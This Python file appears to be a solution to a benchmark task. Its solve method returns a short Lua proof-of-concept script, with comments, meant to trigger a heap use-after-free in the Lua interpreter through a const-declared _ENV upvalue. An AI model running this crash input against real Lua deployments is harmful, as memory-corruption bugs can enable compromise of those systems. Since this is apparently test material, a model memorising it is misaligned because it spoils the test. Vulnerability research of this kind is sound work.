import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in Lua
        related to _ENV <const>.
        """
        # The vulnerability is triggered when _ENV is declared as a const local variable.
        # The Lua compiler (in affected versions like 5.4.0-5.4.3) generates incorrect code
        # for upvalue handling of such variables. This can lead to the _ENV table being
        # garbage collected while a closure still holds a reference to it (or an invalid
        # stack reference), resulting in a Use-After-Free when the closure accesses globals.
        
        poc_script = (
            b"local function factory()\n"
            b"  -- Declare _ENV as a local const table. This is the trigger condition.\n"
            b"  local _ENV <const> = { panic = 'now' }\n"
            b"  \n"
            b"  -- Return a closure that uses a global variable.\n"
            b"  -- This implicitly accesses the local _ENV upvalue.\n"
            b"  return function()\n"
            b"    return panic\n"
            b"  end\n"
            b"end\n"
            b"\n"
            b"-- Create the closure\n"
            b"local closure = factory()\n"
            b"\n"
            b"-- Force garbage collection. If the upvalue was not correctly secured,\n"
            b"-- the _ENV table will be freed here.\n"
            b"collectgarbage()\n"
            b"\n"
            b"-- Execute the closure. It attempts to access the freed _ENV table.\n"
            b"closure()\n"
        )
        
        return poc_script
